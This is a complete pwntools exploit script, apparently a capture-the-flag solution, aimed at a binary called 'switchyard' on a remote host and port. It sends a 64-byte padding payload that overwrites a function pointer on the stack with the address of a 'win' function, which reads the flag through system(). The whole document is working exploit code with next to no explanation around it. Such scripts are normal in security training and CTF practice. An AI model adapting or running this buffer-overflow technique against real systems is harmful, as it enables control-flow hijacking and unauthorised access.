#!/usr/bin/env python3
from pwn import *

# ─── Config ───────────────────────────────────────────────
HOST = "95.216.124.220"
PORT = 30882
BINARY = "./switchyard"

context.arch = "amd64"
context.log_level = "info"

e = ELF(BINARY, checksec=False)

# ─── Addresses ────────────────────────────────────────────
WIN          = e.sym['win']           # 0x4011f5  → system("cat flag.txt")
ROUTE_LOCAL  = e.sym['route_local']   # 0x401186  (safe func to call first)

log.info(f"win         @ {hex(WIN)}")
log.info(f"route_local @ {hex(ROUTE_LOCAL)}")

# ─── Stack layout (relative to second read buffer @ rbp-0x70) ─
# Offset 0x00 : buf data (64 bytes padding)
# Offset 0x40 : func_ptr1  [rbp-0x30]  ← overwrite with win
# Offset 0x48 : func_ptr2  [rbp-0x28]
# Offset 0x50 : magic      [rbp-0x20]

OFFSET_FPTR1 = 0x40   # 64

# ─── Payloads ─────────────────────────────────────────────
# Input 1: "local" sets func_ptr1 = route_local (we'll overwrite it anyway)
input1 = b"local\n"

# Input 2: overwrite func_ptr1 with win
#   padding (64 bytes) + p64(win)
input2  = b"A" * OFFSET_FPTR1
input2 += p64(WIN)

log.info(f"Input 1 : {input1}")
log.info(f"Input 2 ({len(input2)} bytes): {input2.hex()}")

# ─── Exploit ──────────────────────────────────────────────
io = remote(HOST, PORT)

io.recvuntil(b"Route label: ")
io.send(input1)

io.recvuntil(b"Maintenance packet: ")
io.send(input2)

output = io.recvall(timeout=3)
print()
print(output.decode(errors='replace'))
